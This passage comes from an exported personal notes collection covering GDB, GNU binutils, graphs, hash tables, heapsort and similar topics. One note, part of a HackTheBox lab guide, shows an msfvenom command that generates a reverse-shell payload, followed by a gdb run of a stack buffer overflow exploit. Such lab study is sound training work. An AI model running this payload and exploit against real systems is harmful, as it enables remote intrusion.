    "content": "# GDB\n---\nAll the basic commands can be found [](notes/general/useful-commands-dump.md#GDB).\n\n## Remote Debugging\ngdb can be used to debug programs running on another machine. On the remote machine, a program called `gdbserver` is run, which responds and acts on the requests made by gdb on the client machine. \n\nRemote debugging can be more convenient in some cases; for example, it enables inspecting the program on the machine where the bug has occurred instead of trying to replicate the scenario on a dev machine. This can save a lot of time. Remote debugging is quite popular among mobile app developers, where the app runs on a mobile device, while the debugger runs on the development machine.\n\nThe [_Remote debugging with GDB_ blog post](https://developers.redhat.com/blog/2015/04/28/remote-debugging-with-gdb) can get you started in case you are interested. The [gdbserver(1) - Linux manual page](1)%20-%20Linux%20manual%20page) also offers great documentation. The official [RISC-V binutils repository](https://github.com/riscv-collab/riscv-binutils-gdb) has the `gdbserver` source code.\n\n## Assembly Syntax\n```bash\nstudent@nix-bow:~$ gdb -q bow32\n\nReading symbols from bow...(no debugging symbols found)...done.\n(gdb) disassemble main\n\nDump of assembler code for function main:\n   0x00000582 \u003c+0\u003e: \tlea    0x4(%esp),%ecx\n   0x00000586 \u003c+4\u003e: \tand    $0xfffffff0,%esp\n   0x00000589 \u003c+7\u003e: \tpushl  -0x4(%ecx)\n   0x0000058c \u003c+10\u003e:\tpush   %ebp\n   0x0000058d \u003c+11\u003e:\tmov    %esp,%ebp\n   0x0000058f \u003c+13\u003e:\tpush   %ebx\n   0x00000590 \u003c+14\u003e:\tpush   %ecx\n   0x00000591 \u003c+15\u003e:\tcall   0x450 \u003c__x86.get_pc_thunk.bx\u003e\n   0x00000596 \u003c+20\u003e:\tadd    $0x1a3e,%ebx\n   0x0000059c \u003c+26\u003e:\tmov    %ecx,%eax\n   0x0000059e \u003c+28\u003e:\tmov    0x4(%eax),%eax\n   0x000005a1 \u003c+31\u003e:\tadd    $0x4,%eax\n   0x000005a4 \u003c+34\u003e:\tmov    (%eax),%eax\n   0x000005a6 \u003c+36\u003e:\tsub    $0xc,%esp\n   0x000005a9 \u003c+39\u003e:\tpush   %eax\n   0x000005aa \u003c+40\u003e:\tcall   0x54d \u003cbowfunc\u003e\n   0x000005af \u003c+45\u003e:\tadd    $0x10,%esp\n   0x000005b2 \u003c+48\u003e:\tsub    $0xc,%esp\n   0x000005b5 \u003c+51\u003e:\tlea    -0x1974(%ebx),%eax\n   0x000005bb \u003c+57\u003e:\tpush   %eax\n   0x000005bc \u003c+58\u003e:\tcall   0x3e0 \u003cputs@plt\u003e\n   0x000005c1 \u003c+63\u003e:\tadd    $0x10,%esp\n   0x000005c4 \u003c+66\u003e:\tmov    $0x1,%eax\n   0x000005c9 \u003c+71\u003e:\tlea    -0x8(%ebp),%esp\n   0x000005cc \u003c+74\u003e:\tpop    %ecx\n   0x000005cd \u003c+75\u003e:\tpop    %ebx\n   0x000005ce \u003c+76\u003e:\tpop    %ebp\n   0x000005cf \u003c+77\u003e:\tlea    -0x4(%ecx),%esp\n   0x000005d2 \u003c+80\u003e:\tret    \nEnd of assembler dump.\n```\n\nThe hexadecimal numbers in the first column represent the **memory addresses**. The plus sign (**+**) show the **address jumps** in memory bytes. We also have the **assembler instructions** (**mnemonics**) with registers and their **operation suffixes**. \n\nThe current syntax is **AT\u0026T**, which we can recognise by the **%** and **$** characters.\n\n| Memory Address | Address Jumps | Assembler Instruction | Operation Suffixes |\n| -------------- | ------------- | --------------------- | ------------------ |\n| 0x00000582     | \u003c+0\u003e:         | lea                   | 0x4(%esp),%ecx     |\n| 0x00000586     | \u003c+4\u003e:         | and                   | $0xfffffff0,%esp   |\n| ...            | ...           | ...                   | ...                   |\n\nWe can change to the **Intel** syntax:\n\n```bash\n(gdb) set disassembly-flavor intel\n(gdb) disassemble main\n\nDump of assembler code for function main:\n   0x00000582 \u003c+0\u003e:\t    lea    ecx,[esp+0x4]\n   0x00000586 \u003c+4\u003e:\t    and    esp,0xfffffff0\n   0x00000589 \u003c+7\u003e:\t    push   DWORD PTR [ecx-0x4]\n   0x0000058c \u003c+10\u003e:\tpush   ebp\n   0x0000058d \u003c+11\u003e:\tmov    ebp,esp\n   0x0000058f \u003c+13\u003e:\tpush   ebx\n   0x00000590 \u003c+14\u003e:\tpush   ecx\n   0x00000591 \u003c+15\u003e:\tcall   0x450 \u003c__x86.get_pc_thunk.bx\u003e\n   0x00000596 \u003c+20\u003e:\tadd    ebx,0x1a3e\n   0x0000059c \u003c+26\u003e:\tmov    eax,ecx\n   0x0000059e \u003c+28\u003e:\tmov    eax,DWORD PTR [eax+0x4]\n\u003cSNIP\u003e\n```\n\nOr set it as default:\n\n```bash\necho 'set disassembly-flavor intel' \u003e ~/.gdbinit\n```\n\nAnother difference between **Intel** and **AT\u0026T** syntax is the order. For example the instruction:\n\n```bash\n0x0000058d \u003c+11\u003e:\tmov    ebp,esp\n```\n\nWith **Intel** syntax:\n\n| Instruction | Destination | Source |\n| ----------- | ----------- | ------ |\n| mov         | **ebp**     | esp    |\n\nWith **AT\u0026T** syntax:\n\n| Instruction | Destination | Source   |\n| ----------- | ----------- | -------- |\n| mov         | %esp        | **%ebp** |\n\n## See Also\n- [Debugging Techniques](notes/general/debugging-techniques.md)\n- [Stack Overflow](notes/general/htb-stack-based-overflow-linux.md)\n",
    "lastmodified": "2022-11-24T12:20:58.223740935Z",
    "tags": null
  },
  "/notes/general/generate-shellcode": {
    "title": "Generate Shellcode",
    "content": "# Generate Shellcode\n---\nThis is part of a guide that you can find [here](notes/general/htb-stack-based-overflow-linux.md).\n\nWe have to pay attention to:\n\n- Architecture\n- Platform\n- Bad Characters\n\n\nWe can use `msfvenom` to generate our shellcode:\n\n```bash\nmsfvenom -p linux/x86/shell_reverse_tcp lhost=\u003cLHOST\u003e lport=\u003cLPORT\u003e --format c --arch x86 --platform linux --bad-chars \"\u003cchars\u003e\" --out \u003cfilename\u003e\n```\n\nSo:\n\n```bash\nmsfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars \"\\x00\\x09\\x0a\\x20\" --out shellcode\n```\n\nNow we have:\n\n```bash\nBuffer = \"\\x55\" * (1040 - 124 - 95 - 4) = 817\nNOPs = \"\\x90\" * 124\nShellcode = \"\\xda\\xca\\xba\\xe4\\x11...\u003cSNIP\u003e...\\x5a\\x22\\xa2\"\nEIP = \"\\x66\" * 4'\n```\n\nSo we exploit:\n\n```bash\n(gdb) run $(python -c 'print \"\\x55\" * (1040 - 124 - 95 - 4) + \"\\x90\" * 124 + \"\\xda\\xca\\xba\\xe4...\u003cSNIP\u003e...\\xad\\xec\\xa0\\x04\\x5a\\x22\\xa2\" + \"\\x66\" * 4')\n\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\n\nStarting program: /home/student/bow/bow32 $(python -c 'print \"\\x55\" * (1040 - 124 - 95 - 4) + \"\\x90\" * 124 + \"\\xda\\xca\\xba\\xe4...\u003cSNIP\u003e...\\xad\\xec\\xa0\\x04\\x5a\\x22\\xa2\" + \"\\x66\" * 4')\n\nBreakpoint 1, 0x56555551 in bowfunc ()\n```\n\nWe can check if the first bytes of our shellcode matches the bytes after the NOPS:\n\n```bash\n(gdb) x/2000xb $esp+550\n\n\u003cSNIP\u003e\n0xffffd64c:\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\n0xffffd654:\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\n0xffffd65c:\t0x90\t0x90\t0xda\t0xca\t0xba\t0xe4\t0x11\t0xd4\n\t\t\t\t\t\t # |----\u003e Shellcode begins\n\u003cSNIP\u003e\n```\n\n",
    "lastmodified": "2022-11-24T12:20:58.346234322Z",
    "tags": null
  },
  "/notes/general/gnu": {
    "title": "GNU",
    "content": "# GNU\n---\nExtensive collection of free software which can be used as an operating system or in parts with other operating systems.\n\n## The \"Big\" Utilities\n- **gold**: the ELF only linker.\n- **gprof**: the GNU profiler.\n- **gcov**: the GNU coverage tool (not part of binutils, but GCC)\n\n## The \"Small\" Utilities\n- **ar** and **ranlib**: creating static libraries.\n- **nm**: list the symbols in a file.\n- **objcopy**: copy binary files.\n- **objdump** and **readelf**: examine binary files.\n- **size**: print all the strings in a binary program.\n- **strip**: strip all symbols from a file.\n- **c++filt**: C++ name demangler.\n- **addr2line**: convert an address to source code line.\n- **elfedit**: update ELF headers.\n\n### Link Time Optimisation (LTO)\n1. Compile only to intermediate representation (IR), still held in`.o` files.\n2. It then links into one giant file, treating all globals as static.\n3. Apply optimisations to entire file.\n\n## The Assembler\n### libopcodes\n It is in the `opcode` directory, with headers in `include/opcode`.\n \n-  `\u003ctarget\u003e-opc.c` and `\u003ctarget\u003e-opc.h` (optional) are for assembly.\n-  `\u003ctarget\u003e-dis.c` and `\u003ctarget\u003e-dis.h` (optional) are for disassembly. It prints disassembled instructions and matches opcodes and operands.\n\nAlso need to have target specific changes in `configure.in`, `disassemble.c` and `Makefile.am` files in the `opcodes` directory.\n\n**CGEN** will create these automatically for you.\n\n### Sections and Relocation\nA section is a **range of address with no gaps**. \n\nThe linker `ld` reads many object files and combines them into a runnable program. When the assembler emits an object file, the program is assumed to start at address 0. `ld` assigns the final addresses for the partial program, so that different programs don't overlap.\n\n`ld` moves blocks of bytes to their run-time addresses. These blocks slide as rigid units, their length doesn't change neither does the order of bytes. These are called **sections**. Assigning run-time addresses to sections is called **relocation**. It includes the task of adjusting mentions of object-file addresses so they refer to the proper run-time addresses.\n\nAn object file written by the assembler has at least three sections:\n- `text`\n- `data`\n- `bss`\n\nTo let `ld` know which data changes when the sections are relocated, and how to change that data, `as` also writes to the object file details of the relocation needed. `ld` must know this each time an address is mentioned:\n\n- Where in the object file is the beginning of this reference to an address?\n- How long (in bytes) is this reference?\n- Which section does the address refer to? What is the numeric value of `(address) - (start-address of section)`?\n- Is the reference to an address **program-counter relative**?\n\nEvery address `as` ever uses is expressed as `(section) + (offset into section)`.\n\n### Linker Sections\n![Screenshot from 2022-07-11 11-19-21](notes/images/Screenshot%20from%202022-07-11%2011-19-21.png)\n\n- **text** and **data** section:  they hold the program, they are treated as separate but equal sections. When the program is running however, the **text** section is unalterable as it is often shared among processes: it contains instructions, constants etc. The data section is usually alterable, for example C variables would be stored there.\n- **bss** section: it contains 0 bytes when the program begins running. It holds uninitialised variables or common storage.\n- **absolute** section: address 0 of this section is always \"relocated\" to runtime address 0. This is useful if you want to refer to an address that `ld` must not change when relocating.\n- **undefined** section: catch-all for address references to objects no in the preceding sections.\n\n#### Symbols\nThe programmer uses symbols to name things, the linker uses symbols to link, and the debugger uses symbols to debug.\n\n- `typedef` from `struct symbol` in `as.h`.\n- Defined in `symbols.c`.\n\n#### Labels\nThey are written as a symbol immediately followed by a colon `:`. The symbol then represents the current value of the active location counter, and is, for example, a suitable instruction operand.\n\nIf you use the same symbol to represent two different locations: first definition overrides any other definitions.\n\n#### Fixup\nMore [here](notes/general/fixups.md).\n\nAnything that cannot be resolved in the first pass. It is either resolved at the end of assembly or else becomes a relocation.\n\n## Resources\n- Binutils Porting Guide ([here](https://www.sourceware.org/binutils/binutils-porting-guide.txt))\n- [Linker Relaxation](notes/general/linker-relaxation.md)\n- [Relocations](notes/general/relocations.md)\n- [RISCV Toolchain](notes/general/riscv-toolchain.md)\n- [Compiler Toolchains](notes/general/compiler-toolchains.md)\n- [GCC](notes/general/gcc.md)\n- [Fix-ups](notes/general/fixups.md)",
    "lastmodified": "2022-11-24T12:20:58.414808989Z",
    "tags": null
  },
  "/notes/general/graphs": {
    "title": "Graphs",
    "content": "# Graphs\n---\n```toc\n```\n\nA graph consists of:\n- A set of fixed objects, **nodes**.\n- A set of **edges**, which may have arrows and have values attached.\n\n![graph](notes/images/graph.png)\n\nA graph $G = (V, E)$ is composed of:\n- $V$: set of vertices or nodes.\n- $E$: set of edges or lines connecting the vertices in $V$.\n- An edge $e = (u, v)$ is a connection between the vertices $u$ and $v$.\n\nFor example:\n\n![170](notes/images/Screenshot%202022-11-07%20at%2009.44.16.png)\n\n- $V$ = {1, 2, 3, 4, 5}\n- $E$ = {(1, 2), (1, 3), (3, 5), (2, 5), (5, 4)}\n\n## Terminology\n![Screenshot 2022-11-07 at 09.45.46](notes/images/Screenshot%202022-11-07%20at%2009.45.46.png)\n\n- An **undirected** graph has no arrows on edges.\n- A **directed** graph or **digraph** has arrows on edges.\n- Two nodes connected by an edge are **adjacent**.\n- A **weighted graph** has values attached to edges.\n- A path from a node back to itself is a **cycle**.\n- An **undirected** graph with **no cycles** is a [tree](notes/general/trees.md).\n- A **directed** graph with **no cycles** is a **directed acyclic graph** or DAG.\n- A **DAG** where no node is pointed to by more than one node is a **directed** [tree](notes/general/trees.md).\n- A **complete** graph is normally an undirected graph with an edge between **each** pair of vertices.\n\n## Graph Search\nWe start at the source node and search until we find the target node. We normally want to visit each node **once and only once**.\n\n- [Depth-First Search](notes/university/depth-first-search.md)\n- [Exhaustive Search](notes/university/exhaustive-search.md)\n- [Breath-First Search](notes/university/breadth-first-search.md)\n- [Best-First Search - A* Search](notes/university/best-first-search.md)\n- [Minimum Spanning Tree (MST) - Prim's](notes/general/minimum-spanning-tree.md)\n\n## Paths\nA sequence of `k` vertices, `[v1, v2, ..., vk]`, such that any pair of consecutive vertices, `vi, vi+1` are adjacent (connected by an edge) is called a **path**.\n\n![Screenshot 2022-10-24 at 12.49.45](notes/images/Screenshot%202022-10-24%20at%2012.49.45.png)\n\n## How do we represent a graph when it comes to implementation?  \nWe often represent a graph as a matrix (2D array), although other data structures can be used depending on the application.\n\nIf we have $N$ nodes to represent: for an $N$ by $N$ matrix $G$, a non-zero value of $g_{ij}$ ($i$th row, $j$th column of $G$) means there is an edge between node $i$ and $j$.  \n\n### Undirected  \n- We assume that $g_{ij}$ is the same as $g_{ji}$.\n### Directed  \n- $g_{ij}$ is not always the same as $g_{ji}$.\n### Non-weighted  \n- $g_{ij}$ is either one for an edge or zero for no edge.\n### Weighted  \n- $g_{ij}$ is the edge weight or zero for no edge.\n### Complete  \n- $g_{ij}$ is never zero.\n\n## Adjacency Matrix - Recap\nIf we have $N$ nodes to represent:\n- For an $N$ by $N$ matrix $G$ a non-zero value of $g_0$ ($i$th row $j$)\n\n## See also\n- [Trees](notes/general/trees.md)\n- [Dijkstra](notes/general/dijkstra-algorithm.md)\n- [Floyd-Warshall](notes/general/floyd-warshall.md)\n- [Inkblot](notes/general/inkblot-algorithm.md)\n- [Graphviz](notes/general/graphviz.md)",
    "lastmodified": "2022-11-24T12:20:58.507941961Z",
    "tags": null
  },
  "/notes/general/graphviz": {
    "title": "Graphviz",
    "content": "# Graphviz\n---\nGraphiz is a package of tools supporting the DOT [graph](notes/general/graphs.md) description language.\n\n**DOT** is a textual representation of arbitrary graphs (suffix `.dot` or preferably `.gv`).\n\nTools can visualise those graphs. For example `xdot`.\n\n```bash\nsudo apt install graphviz\n```\n\nOfficial website [here](https://graphviz.org/).\n\n## See also\n- [Graphs](notes/general/graphs.md)",
    "lastmodified": "2022-11-24T12:20:58.587865114Z",
    "tags": null
  },
  "/notes/general/hackthebox": {
    "title": "HackTheBox",
    "content": "# HackTheBox\nEverything related to HackTheBox.\n\n- Files Transfers ([here](notes/general/htb-file-transfers.md))\n- Netcat ([here](notes/general/netcat.md))\n- Stack-based Buffer Overflows on Linux x86 ([here](notes/general/htb-stack-based-overflow-linux.md))\n- MSFConsole ([here](notes/general/htb-msfconsole-cheatsheet.md))\n- Meterpreter ([here](notes/general/htb-meterpreter-cheatsheet.md))\n\n## Cheatsheets\n- Files Transfers Cheatsheet ([here](notes/general/htb-file-transfer-cheatsheet.md))\n- NMap Cheatsheet ([here](notes/general/nmap-cheatsheet.md))\n\n## Write-ups\n- [Driver](notes/general/htb-driver.md)\n- [Pandora](notes/general/htb-pandora.md)\n- [Secret](notes/general/htb-secret.md)",
    "lastmodified": "2022-11-24T12:20:58.607566595Z",
    "tags": null
  },
  "/notes/general/halting-problem": {
    "title": "Halting Problem",
    "content": "# Halting Problem\n---\nA program to determine if **any** given program will complete in finite time.\n\nSo imagine you write this program, P, and in its main program it has:\n```c\nif (willhalt (prog))\n  printf (\"Supplied program will halt\");\nelse\n  printf (\"Supplied program will not halt\");\n```\n\nNow edit P to create program Q:\n```c\nif (willhalt (q))\n  whilte (1);\nelse\n  exit (0);\n```\n\nFeed Q to itself. Will it halt?\n\n- Restricting the problem makes it tractable.\n- Event loops are often infinite loops.\n- Beware requirements masquerading as the halting problem.\n\n## See also\n- [Problems](notes/general/cs-problems.md)",
    "lastmodified": "2022-11-24T12:20:58.672983408Z",
    "tags": null
  },
  "/notes/general/hash-tables": {
    "title": "Hash Tables",
    "content": "# Hash Tables\n---\nA hash table is a data structure which offers a fast implementation of the associative array (abstract data structure, also called a map, symbol table or dictionary) [](notes/general/hash-tables.md#API%7CAPI). It maps a **Key** to a **Value**.\n\nImportant to note that key and value could be **any type** of data structure.\n\nA hash table consists of an array of 'buckets', each of which stores a key-value pair. In order to locate the bucket where the key-value pair should be stored, the key is passed through a hashing function. This function returns an integer which is used as the pair's index in the array of buckets. When we want to retrieve a key-value pair, we supply the key to the same hashing function, receive its index, and use the index to find it in the array.\n\nArray indexing has algorithmic [complexity](notes/general/big-o-notation.md) `O(1)`, making hash tables fast at storing and retrieving data.\n\n- Hash tables are [vector](notes/general/vectors-arrays.md) with *n* entries.\n\nHash functions:\n- H(**k**) gives a key, **k**, yields a value in the range [0,n] (it is important to have an even distribution).\n- Store key, **k**, and value, **v**, at index H(**k**) in the [vector](notes/general/vectors-arrays.md).\n    - May end up with multiple keys with the same H(**k**).\n        - Build up a double linked list of entries (_open_ hash table).\n        - Use next available free slot (_closed_ hash table).\n\n## Efficiency\nHash function must have a good distribution and must be **large enough**. _Closed_ tables may run out of space, _open_ tables may get inefficiently large lists.\n\n- Algorithms exist for the [perfect hash function](https://en.wikipedia.org/wiki/Perfect_hash_function).\n\nA well design insertion and lookup is $O(1)$.\n\n## API\nAssociative arrays are a collection of unordered key-value pairs. Duplicate keys are not permitted. The following operations are supported:\n\n- `search(a, k)`: return the value `v` associated with key `k` from the associative array `a`, or `NULL` if the key does not exist.\n- `insert(a, k, v)`: store the pair `k:v` in the associative array `a`.\n- `delete(a, k)`: delete the `k:v` pair associated with `k`, or do nothing if `k` does not exist.\n\n## Using Hash Tables\nThe **hash function** return the **hash value**, which maps the key to an index in the table.\n\n**Collision**: two things with different hash codes could be mapped to the same index.\n\n## Applications\n- Address books\n- Linking file name and path (local system)\n- Password verification",
    "lastmodified": "2022-11-24T12:20:58.687640548Z",
    "tags": null
  },
  "/notes/general/heapsort": {
    "title": "Heapsort",
    "content": "# Heapsort\n---\nUses [binary heap trees](notes/general/binary-heap.md) to [sort](notes/general/sorting.md) (I think!).\n\nIt has average [](notes/general/compiler-optimisation.md#Performance%7Cperformance): $O_{n\\ log\\ n}$\nWorst case performance: $O_{n\\ log\\ n}$\n\n- Refer to [big o notation](notes/general/big-o-notation.md).\n\nIt is not [](notes/general/sorting.md#Stability%7Cstable).\n\nValuable data representation for anything where you need to quickly access the largest (smallest) element.    \n- e. g.:  time ordered queue, with the next item at the root.\n\n```c\nvoid\nheapify (int *a, int i, int n)\n{\n  int lc = 2 * i + 1;          /* Index of left child */\n  int rc = 2 * i + 2;          /* Index of right child */\n\n  if (lc \u003c= (n - 1))           /* Not a leaf */\n  {\n    int k;                     /* Larger child (if \u003e a[i]) */\n    if (rc \u003e (n - 1))\n      if (a[lc] \u003e a[i])\n        k = lc;                /* Swap left child */\n      else\n        return;                /* Heap in order */\n    else if ((a[lc] \u003e= a[i]) \u0026\u0026 (a[lc] \u003e= a[rc]))\n      k = lc;                  /* Swap left child */\n    else if (a[rc] \u003e= a[i])\n      k = rc;                  /* Swap right child */\n    else\n      return;                  /* Heap in order */\n\n    swap ((\u0026a[i]), \u0026(a[k]));   /* Swap the larger child */\n    heapify (a, k, n);\n  }\n}\n```\n\n## Buildheap\n```c\nvoid\nbuildheap (int *a)\n{\n  int i;\n\n  for (i = N - 1; i \u003e= 0; i--)\n    heapify (a, i, N);\n}\n```\n\n### To sort with a binary heap:\n```c\nbuildheap(a);\n\nfor (i = N - 1; i \u003e= 0; i--)\n{\n  swap (\u0026(a[0]), \u0026(a[i]));\n  heapify (a, 0, i);\n}\n```\n\n## Output\n### Building the heap\n```bash\n16 16  0 14  9 11 10  2  3  4  1 11  8 17 14  5 11 12 15 16\n16 16  0 14  9 11 10  2  3 16  1 11  8 17 14  5 11 12 15  4\n16 16  0 14  9 11 10  2 15 16  1 11  8 17 14  5 11 12  3  4\n16 16  0 14  9 11 10 11 15 16  1 11  8 17 14  5  2 12  3  4\n16 16  0 14  9 11 17 11 15 16  1 11  8 10 14  5  2 12  3  4\n16 16  0 14 16 11 17 11 15  9  1 11  8 10 14  5  2 12  3  4\n16 16  0 15 16 11 17 11 14  9  1 11  8 10 14  5  2 12  3  4\n16 16 17 15 16 11  0 11 14  9  1 11  8 10 14  5  2 12  3  4\n16 16 17 15 16 11 14 11 14  9  1 11  8 10  0  5  2 12  3  4\n16 16 17 15 16 11 14 11 14  9  1 11  8 10  0  5  2 12  3  4\n17 16 16 15 16 11 14 11 14  9  1 11  8 10  0  5  2 12  3  4\n```\n\n### Creating the sort\n```bash\n16  4 16 15 16 11 14 11 14  9  1 11  8 10  0  5  2 12  3 17\n16 16 16 15  4 11 14 11 14  9  1 11  8 10  0  5  2 12  3 17\n16 16 16 15  9 11 14 11 14  4  1 11  8 10  0  5  2 12  3 17\n16  3 16 15  9 11 14 11 14  4  1 11  8 10  0  5  2 12 16 17\n16 15 16  3  9 11 14 11 14  4  1 11  8 10  0  5  2 12 16 17\n16 15 16 14  9 11 14 11  3  4  1 11  8 10  0  5  2 12 16 17\n16 15 16 14  9 11 14 11 12  4  1 11  8 10  0  5  2  3 16 17\n16 15  3 14  9 11 14 11 12  4  1 11  8 10  0  5  2 16 16 17\n16 15 14 14  9 11  3 11 12  4  1 11  8 10  0  5  2 16 16 17\n16 15 14 14  9 11 10 11 12  4  1 11  8  3  0  5  2 16 16 17\n15  2 14 14  9 11 10 11 12  4  1 11  8  3  0  5 16 16 16 17\n15 14 14  2  9 11 10 11 12  4  1 11  8  3  0  5 16 16 16 17\n15 14 14 12  9 11 10 11  2  4  1 11  8  3  0  5 16 16 16 17\n14  5 14 12  9 11 10 11  2  4  1 11  8  3  0 15 16 16 16 17\n14 12 14  5  9 11 10 11  2  4  1 11  8  3  0 15 16 16 16 17\n14 12 14 11  9 11 10  5  2  4  1 11  8  3  0 15 16 16 16 17\n14 12  0 11  9 11 10  5  2  4  1 11  8  3 14 15 16 16 16 17\n14 12 11 11  9  0 10  5  2  4  1 11  8  3 14 15 16 16 16 17\n14 12 11 11  9 11 10  5  2  4  1  0  8  3 14 15 16 16 16 17\n12  3 11 11  9 11 10  5  2  4  1  0  8 14 14 15 16 16 16 17\n12 11 11  3  9 11 10  5  2  4  1  0  8 14 14 15 16 16 16 17\n12 11 11  5  9 11 10  3  2  4  1  0  8 14 14 15 16 16 16 17\n11  8 11  5  9 11 10  3  2  4  1  0 12 14 14 15 16 16 16 17\n11  9 11  5  8 11 10  3  2  4  1  0 12 14 14 15 16 16 16 17\n11  9  0  5  8 11 10  3  2  4  1 11 12 14 14 15 16 16 16 17\n11  9 11  5  8  0 10  3  2  4  1 11 12 14 14 15 16 16 16 17\n11  9  1  5  8  0 10  3  2  4 11 11 12 14 14 15 16 16 16 17\n11  9 10  5  8  0  1  3  2  4 11 11 12 14 14 15 16 16 16 17\n10  9  4  5  8  0  1  3  2 11 11 11 12 14 14 15 16 16 16 17\n 9  2  4  5  8  0  1  3 10 11 11 11 12 14 14 15 16 16 16 17\n 9  8  4  5  2  0  1  3 10 11 11 11 12 14 14 15 16 16 16 17\n 8  3  4  5  2  0  1  9 10 11 11 11 12 14 14 15 16 16 16 17\n 8  5  4  3  2  0  1  9 10 11 11 11 12 14 14 15 16 16 16 17\n 5  1  4  3  2  0  8  9 10 11 11 11 12 14 14 15 16 16 16 17\n 5  3  4  1  2  0  8  9 10 11 11 11 12 14 14 15 16 16 16 17\n 4  3  0  1  2  5  8  9 10 11 11 11 12 14 14 15 16 16 16 17\n 3  2  0  1  4  5  8  9 10 11 11 11 12 14 14 15 16 16 16 17\n 2  1  0  3  4  5  8  9 10 11 11 11 12 14 14 15 16 16 16 17\n 1  0  2  3  4  5  8  9 10 11 11 11 12 14 14 15 16 16 16 17\n 0  1  2  3  4  5  8  9 10 11 11 11 12 14 14 15 16 16 16 17\n```\n\n## Code Example\n```c\n/* Basic heapsort\n\n   Copyright (C) 2020 Embecosm Limited \u003cwww.embecosm.com\u003e\n   Contributor: Jeremy Bennett \u003cjeremy.bennett@embecosm.com\u003e\n   SPDX-License-Identifier: GPL-3.0-or-later */\n\n#include \u003cstdlib.h\u003e\n#include \u003cstdio.h\u003e\n\n#ifndef N\n#define N 20\n#endif\n\nvoid\npopulate (int arr[])\n{\n  for (int i = 0; i \u003c N; i++)\n    arr[i] = rand () % N;\n}\n\nvoid\nswap (int *a, int *b)\n{\n  int t = *a;\n  *a = *b;\n  *b = t;\n}\n\nvoid\ndump_array (int arr[])\n{\n  for (int i = 0; i \u003c N; i++)\n    printf (\"%2d \", arr[i]);\n\n  printf (\"\\n\");\n}\n\nvoid\nheapify (int *a, int i, int n)\n{\n  int lc = 2 * i + 1;\t\t/* Index of left child */\n  int rc = 2 * i + 2;\t\t/* Index of right child */\n\n  if (lc \u003c= (n - 1))\t\t/* Not a leaf) */\n    {\n      int  k;\t\t\t/* Larger child (if \u003e a[i]) */\n      if (rc \u003e (n - 1))\n\tif (a[lc] \u003e a[i])\n\t  k = lc;\t\t/* Swap left child */\n\telse\n\t  return;\t\t/* Heap in order */\n      else if ((a[lc] \u003e a[i]) \u0026\u0026 (a[lc] \u003e= a[rc]))\n\tk = lc;\t\t\t/* Swap left child */\n      else if (a[rc] \u003e= a[i])\n\tk = rc;\t\t\t/* Swap right child */\n      else\n\treturn;\t\t\t/* Heap in order */\n\n      swap ((\u0026a[i]), \u0026(a[k]));\t/* Swap the larger child */\n      dump_array (a);\n      heapify (a, k, n);\n    }\n}\n\nvoid\nbuildheap (int *a)\n{\n  int i;\n\n  for (i = N - 1; i \u003e= 0; i--)\n    heapify (a, i, N);\n}\n\nint\nmain ()\n{\n  int a[N];\n  int i;\n\n  srand (561U);\n\n  populate (a);\n  dump_array (a);\n\n  buildheap (a);\n  printf (\"\\n\");\n\n  for (i = N - 1; i \u003e= 0; i--)\n    {\n      swap (\u0026(a[0]), \u0026(a[i]));\n      heapify (a, 0, i);\n    }\n  dump_array (a);\n  return 0;\n}\n\n/*\nLocal Variables:\nmode: C\nc-file-style: \"gnu\"\nEnd:\n*/\n```",
    "lastmodified": "2022-11-24T12:20:58.721467972Z",
    "tags": null
  },
  "/notes/general/help": {
    "title": "Help",
    "content": "\n# HELP\n\nVarious cheatsheets of different application I use and all the help I can get compiled in one place.\n\n\u003ccenter\u003e\u003cimg src=\"https://c.tenor.com/_h_1fcwEkHYAAAAC/studying-windy.gif\"\u003e\u003c/center\u003e\n\n## Cheatsheets\n- [Vim](notes/general/vim-cheatsheet.md)\n- [iTerm2](notes/general/iterm2-cheatsheet.md)\n- [Obsidian](notes/obsidian-cheatsheet.md)\n- [Tmux](notes/general/tmux-cheatsheet.md)\n- [HackTheBox](notes/general/hackthebox.md)\n- [How to manually check an Assembly test](notes/general/how-to-manually-check-as-test.md)\n- [How to add an instruction to the GNU Assembler](notes/general/how-to-add-instructions-to-as.md)\n    - [Slides](notes/general/how-to-add-instructions-to-as-slides.md)\n\n## Hacking\n- [x86 CheatSheet](https://trailofbits.github.io/ctf/vulnerabilities/references/X86_Win32_Reverse_Engineering_Cheat_Sheet.pdf)\n- [Reverse Engineering Malicious Code](https://zeltser.com/media/docs/reverse-engineering-malicious-code-tips.pdf)\n- [](http://ref.x86asm.net/coder64.html#x02)\n- [Linux System Call Table for x86-64](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)\n- [](https://en.wikipedia.org/wiki/List_of_HTTP_status_codes#3xx_redirection)\n\n## Other\n- [Commands Dump](notes/general/useful-commands-dump.md)\n- [Linux Fundamentals](notes/general/linux-fundamentals.md)\n- [Dotfiles Management](notes/general/dotfile-management.md)\n- [Courses Dump](notes/general/courses-dump.md)\n\n## All of them\n```dataview\ntable without ID\ntitle as \"Title\", file.ctime as \"Created Time\", file.link as \"Link\"\nfrom #help and -#hub and -#slides\nsort file.ctime desc\n```\n",
    "lastmodified": "2022-11-24T12:20:58.80530858Z",
    "tags": null
  },
  "/notes/general/how-to-add-instructions-to-as": {
    "title": "How to add an instruction to the GNU assembler",
    "content": "# How to add an instruction to the GNU assembler\n---\nWe can use `cv.starti` as an example.  It is part of the hardware loops extension and declares the address of the offset to the start of the loop as well as the loop number, 0 or 1 depending if it is an inner or outer loop.\n\n- `cv.starti Ln, uimmL`\n\n- `Ln`: is it inner or outer loop?\n- `uimmL`: offset of the start of the loop.\n\n| BITS  | 31 20       | 19 15 | 14 12  | 11 08 | 7   | 06 00  |\n| ----- | ----------- | ----- | ------ | ----- | --- | ------ |\n| FIELD | uimmL[11:0] | rs1   | funct3 | rd    | ln  | opcode |\n\nSo: `XXXX XXXX XXXX 00000 000 0000 X 111 1011`\n\n## Summary of Changes\nWe need to change the `opcodes` library (`opcodes/`):\n\n- Table driven encoding and decoding of instructions (`riscv-opc.c` (encoding) and `riscv-dis.c` (decoding)).\n- Change the assembler (`gas/config`) to use the new tables (`tc-riscv.c` and `tc-riscv.h`).\n- Extend relocations: modify BFD in `bfd/`.\n\n### riscv-opc.c\nEntry in `riscv-opc.c`:\n\n```c\n{\"cv.starti\", 0, 